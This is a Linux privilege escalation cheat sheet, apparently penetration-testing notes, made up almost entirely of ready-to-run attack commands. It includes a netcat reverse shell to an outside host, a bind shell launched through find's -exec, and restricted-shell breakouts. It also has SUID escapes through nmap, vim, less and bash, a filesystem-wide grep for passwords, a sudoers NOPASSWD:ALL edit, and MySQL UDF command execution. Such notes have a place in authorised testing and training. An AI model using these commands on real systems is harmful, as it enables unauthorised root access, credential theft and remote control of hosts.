# Linux privilege escalation
### Spawn Interactive Shell and set env  

python -c 'import pty;pty.spawn("/bin/bash");'  
ctrl z  
echo $TERM  
stty -a  
stty raw -echo  
fg  

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH  
export TERM=xterm256-color  
export SHELL=bash  

stty rows \<> colums \<>  

### Restricted bash
perl -e 'exec "/bin/sh";'  
/bin/sh -i  
exec "/bin/sh";  
echo os.system('/bin/bash')  
/bin/sh -i  
ssh user@$ip nc $localip 4444 -e /bin/sh  
export TERM=linux  

### Check environment 
Check any restricitions on any folders  
mount -l        >> any no exec or no suid?  

Check any unmounted drives  
cat /etc/fstab  

### SUID
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.  
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.  
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.  

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID < full search  
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin < quicker  

-find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null  

find / perm /u=s -user "User name that you are looking for" 2>/dev/null  

### Writable file and nobody files  
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files  
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files  

### Writable by current user  
find / perm /u=w -user `whoami` 2>/dev/null  
find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null  
find / -perm /u+w -user `whoami` 2>/dev/nul  

### Any script files that we can modify?  
find / -writable -type f -name "*.py" 2>/dev/null     #find all python file that can be write by us  

ls -aRl / | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone  
ls -aRl / | awk '$1 ~ /^..w/' 2>/dev/null       # Owner  
ls -aRl / | awk '$1 ~ /^.....w/' 2>/dev/null    # Group  
ls -aRl / | awk '$1 ~ /w.$/' 2>/dev/null        # Other  

find / -readable -type f 2>/dev/null               # Anyone  
find / -readable -type f -maxdepth 1 2>/dev/null   # Anyone  

### Any service running by root?  
ps aux|grep "root"  

/usr/bin/journalctl (Which is normally not readable by a user) << cron job?  

### Find password  
grep -rnw '/' -ie 'pass' --color=always  
grep -rnw '/' -ie 'DB_PASS' --color=always  
grep -rnw '/' -ie 'DB_PASSWORD' --color=always  
grep -rnw '/' -ie 'DB_USER' --color=always  

# Exploit Time
## SUID
#### Is suid bit set on these applications?

Nmap  
    nmap -V     <Nmap version 2.02 - 5.21 had an interactive mode  
    nmap --interactive  
    nmap> !sh  
    
Vim  
    Modify system file, e.g. passwd?  
    
    vim.tiny  
    - Press ESC key  
    :set shell=/bin/sh  
    :shell  
    
find  
    touch pentestlab  
    find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;  
    
Bash  
    bash -p      
            
More  
    
Less  
    less /etc/passwd  
    !/bin/sh  

Nano  
    Can you modify system file?  
    Modify /etc/suoders  
    \<user> ALL=(ALL) NOPASSWD:ALL  
    
cp  
    Use cp to overwrite passwd with a new password  
    
### Is there a custom suid application?  
How can this application be run?  
Can be modify the path variable so that it will execute something else  

## NFS priv esc
https://medium.com/@Kan1shka9/hacklab-vulnix-walkthrough-b2b71534c0eb

## Linux capability
find / -type f -print0 2>/dev/null | xargs -0 getcap 2>/dev/null
getcap -r /

google that capability on how it can help us get root

## Mysql run by root
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library
https://www.exploit-db.com/exploits/1518/

You can also try
select sys_exec('echo test>/tmp/test.txt');
select sys_eval('echo test>/tmp/test.txt');

